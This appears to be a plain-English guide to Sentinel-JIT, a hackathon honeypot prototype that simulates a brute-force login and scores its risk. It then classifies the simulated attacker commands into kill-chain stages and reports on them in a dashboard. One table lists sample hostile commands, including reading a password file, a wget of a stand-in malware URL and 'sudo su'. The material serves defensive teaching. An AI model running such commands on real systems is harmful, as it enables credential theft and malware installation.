# 🛡️ Understanding Sentinel-JIT

### A plain-English guide to what this project does — no technical knowledge needed

---

## The Big Problem: What happens when a burglar enters your house?

Imagine you own a bank. A burglar sneaks in at night.

**What most banks do:**  
The moment an alarm goes off → security immediately locks all doors and throws the burglar out.

The burglar leaves. The bank is safe. But here's the problem:

> **Security never got to see what the burglar was looking for.**  
> They don't know which vault he tried to open, what tools he used,  
> or if he has friends coming next week.

---

## The Sentinel-JIT Idea: The Decoy Vault

**What Sentinel-JIT does instead:**  
The moment the alarm goes off → security quietly opens a **fake vault**.  
The vault looks real. The money inside looks real. But it's all fake — controlled and monitored.

The burglar walks into the fake vault and starts working.

Meanwhile, security is watching behind a one-way mirror, recording everything:
- Which drawer did he open first?
- What tools is he using?
- Is he looking for cash or documents?

Now security has **intelligence** — they understand the burglar's technique,  
and they can use that to prevent the NEXT attack.

---

## How This Translates to Cybersecurity

Instead of a burglar, think of a **hacker** trying to break into a computer system.

| Real World | Cyber World |
|---|---|
| Burglar | Hacker / Attacker |
| Bank | Computer system / server |
| Fake vault | Decoy environment (honeypot) |
| Money | Files, passwords, system data |
| One-way mirror | Our monitoring software |
| Security report | Incident report |

---

## What Actually Happens Step by Step

### Step 1 — The Attacker Tries to Break In

The hacker sits at their computer and tries to log into a system.  
They don't know the password, so they guess — over and over again.  
This is called a **brute-force attack**.

In our prototype, `attack_simulator.py` simulates this:
```
Attempt 1 → FAILED (wrong password)
Attempt 2 → FAILED
Attempt 3 → FAILED
Attempt 4 → FAILED
Attempt 5 → FAILED
Attempt 6 → SUCCESS (they got in)
```

All of these attempts are written into `logs.json` — our digital notebook.

---

### Step 2 — Our System Calculates: How Dangerous Is This?

The `risk_engine.py` reads the notebook (`logs.json`) and asks:

- How many times did they fail to log in? (5 times = suspicious)
- Did they actually get in? (yes = very suspicious)

It gives a **risk score from 0 to 100:**

| Score | Meaning | Action |
|---|---|---|
| 0–39 | Probably nothing | Do nothing |
| 40–70 | A bit suspicious | Watch carefully |
| **71–100** | **Clearly an attack** | **Activate the decoy** |

In our simulation: **5 failed logins × 10 pts + 8 commands × 5 pts = 90 points → HIGH RISK**

So the system decides: **activate the decoy environment.**

---

### Step 3 — The Attacker Is Inside the Decoy

The attacker thinks they broke into a real system.  
But they're actually inside a fake, controlled copy — a **honeypot**.

They start running commands on the computer to explore the system.  
In our simulation, `attack_simulator.py` generates these 8 commands:

| Command | What the attacker thinks they're doing |
|---|---|
| `whoami` | "Who am I logged in as?" |
| `id` | "What permissions do I have?" |
| `uname -a` | "What operating system is this?" |
| `ls` | "What files are in this folder?" |
| `cd /home` | "Let me look inside the home folder" |
| `cat passwords.txt` | "Let me steal the password file" |
| `wget http://malware.sh` | "Let me download a hacking tool" |
| `sudo su` | "Let me try to become the administrator" |

All of these are completely fake — there are no real passwords,  
no real files, no real system. But the attacker doesn't know that.

---

### Step 4 — AI Classifies What the Attacker Did

`ai_analysis.py` is like a detective who reads the list of commands  
and says: *"Okay, what was this person actually trying to accomplish?"*

It groups each command into a **stage of the attack**,  
based on a real cybersecurity framework called MITRE ATT&CK:

| Stage | What it means in plain English |
|---|---|
| **Reconnaissance** | The attacker is gathering information — learning the lay of the land |
| **Discovery** | They're exploring files and folders — looking for anything valuable |
| **Credential Access** | They're trying to steal passwords |
| **Malware Deployment** | They're downloading attack tools onto the machine |
| **Privilege Escalation** | They're trying to gain admin/root powers — full control |

This sequence — gather info → explore → steal passwords → install tools → take control —  
is called a **kill-chain**. It's the typical pattern of a real cyberattack.

---

### Step 5 — The Dashboard Shows Everything

`app.py` is the **control room screen** — like the monitors security guards watch.

It shows:

| Section | What it tells you |
|---|---|
| **Threat Overview** | Who attacked, when, how dangerous it was, whether decoy was triggered |
| **Command Timeline** | Every command the attacker ran, with exact timestamps |
| **AI Analysis** | Plain-English explanation of what the attacker was trying to do |
| **Incident Report** | Official summary document + download button |

---

## What Is an Incident Report?

An **Incident Report** is an official document that records everything:

- **Who** attacked (their IP address — like their digital home address)
- **What** they did (every command they ran)
- **How dangerous** it was (risk level)
- **What to do next** (recommended security actions)

Think of it like a **police report after a break-in**.  
It's written in clear language so it can be shared with management, law enforcement, or insurance.

In our dashboard, it looks like a clean summary with a **Download button**  
so you can save it as a text file and share it with anyone.

---

## The Full Flow in One Picture

```
🧑‍💻 Attacker tries to log in
        │
        ▼
📝 attack_simulator.py
   "The attacker failed 5 times, then got in. They ran 8 commands."
   → Writes everything to logs.json
        │
        ▼
🧮 risk_engine.py
   "Risk score = 90. That's HIGH. Activate the decoy."
        │
        ▼
🤖 ai_analysis.py
   "They did Reconnaissance → Discovery → Credential Theft → Malware → Escalation.
    Classic kill-chain. Escalate to security team."
        │
        ▼
🖥️ app.py (Dashboard)
   Shows everything visually.
   Lets you download the incident report.
```

---

## What This Project Does NOT Do (Yet)

This is a **hackathon prototype** — it simulates the attack.  
In a real system, these parts would be connected to actual servers:

| What we simulate | What a real system would have |
|---|---|
| Fake login attempts in code | Real SSH/web server logs being monitored |
| Hard-coded attacker commands | Commands typed by real attackers in a real honeypot |
| Rule-based classification | Trained AI model with millions of attack patterns |
| Manual dashboard refresh | Live real-time auto-updating dashboard |

But the **concept, architecture, and logic** are exactly how a real  
Just-In-Time Deception Security System would work.

---

## Why Is This Idea Valuable?

Most security systems are **reactive** — they block the attacker and move on.

Sentinel-JIT is **proactive** — it learns from every attack attempt.

Every attacker who enters the decoy teaches the system something new.  
Over time, you build a **library of known attack patterns**,  
making your defenses smarter with every breach attempt.

> *"The best way to understand how an attacker thinks is to watch them work —
> in a place where they can't do any real damage."*

---

*Sentinel-JIT — Autonomous Just-In-Time Deception Security System*  
*Built as a hackathon prototype. For demonstration purposes only.* 🛡️

